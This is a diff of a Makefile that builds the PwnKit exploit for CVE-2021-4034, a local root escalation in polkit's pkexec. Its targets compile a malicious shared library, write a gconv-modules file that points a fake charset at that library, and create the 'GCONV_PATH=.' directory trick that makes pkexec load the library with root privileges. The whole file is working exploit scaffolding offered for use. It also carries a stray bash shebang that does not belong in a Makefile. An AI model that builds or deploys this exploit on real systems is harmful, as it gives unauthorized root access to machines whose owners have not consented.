@@ -1,7 +1,24 @@
-all: PwnKit
+#!bin/bash
 
-PwnKit:
-	gcc -shared exploit.c -o exploit -Wl,-e,entry -fPIC
+.PHONY: all
+all: pwnkit.so cve-2021-4034 gconv-modules gconvpath
 
+.PHONY: clean
 clean:
-	rm PwnKit 
+	rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./
+	make -C dry-run clean
+
+gconv-modules:
+	echo "module UTF-8// PWNKIT// pwnkit 1" > $@
+
+.PHONY: gconvpath
+gconvpath:
+	mkdir -p GCONV_PATH=.
+	cp pwnkit.so GCONV_PATH=./pwnkit.so:.
+
+pwnkit.so: pwnkit.c
+	gcc -Wall --shared -fPIC -o $@ $<
+
+.PHONY: dry-run
+dry-run:
+	make -C dry-run
